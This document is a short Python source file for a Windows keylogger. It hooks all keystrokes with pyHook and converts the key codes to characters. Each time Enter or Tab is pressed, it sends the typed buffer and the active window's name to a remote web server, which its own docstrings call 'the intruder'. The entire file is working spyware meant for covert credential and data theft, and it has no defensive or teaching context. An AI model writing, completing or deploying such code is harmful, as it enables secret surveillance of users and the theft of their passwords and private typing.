import pythoncom, pyHook
import thread
import requests

BUFF = ""
WEB_SRV_IP, WEB_SRV_PRT = "W.X.Y.Z", 8888 #IP and PORT of webserver to send to

def web_transfer(ip, port, chunk):
    """
        Transfers captured data to the intruder via an http post request
    """
    global BUFF
    try:
        requests.post("http://"+ip+":"+str(port), chunk)
        BUFF = ""
    except requests.ConnectionError:
        print "Connection error: server might be down ..."
        pass
    return

def translate(event):
	"""
		Converts windows virtual key codes to ascii characters.
		If key code is an alphabet, use it's ascii value, otherwise, use key
		name.
	"""
	if(event.Ascii >= 0 and event.Ascii <= 31) or (event.Ascii == 127):
		return event.Key
	else:
		return chr(event.Ascii)

def intercept(event):
	"""
		Intercepts keystrokes events, appends them to a buffer after translating
        them to chars, if char is ENTER or TAB it sends the buffer to the
        intruder via HTTP post request.
	"""
	global BUFF

	BUFF += translate(event)

	if(event.Ascii == 13 or event.Ascii == 9):
		window_name = event.WindowName
		chunk = {'client_id': 2, 'window_nm': window_name, 'captured' : BUFF}
		thread.start_new_thread(web_transfer, (WEB_SRV_IP, WEB_SRV_PRT, chunk))
	return True

def main():
    obj = pyHook.HookManager()
    obj.KeyDown = intercept
    obj.HookKeyboard()
    pythoncom.PumpMessages()

if __name__ == '__main__':
    main()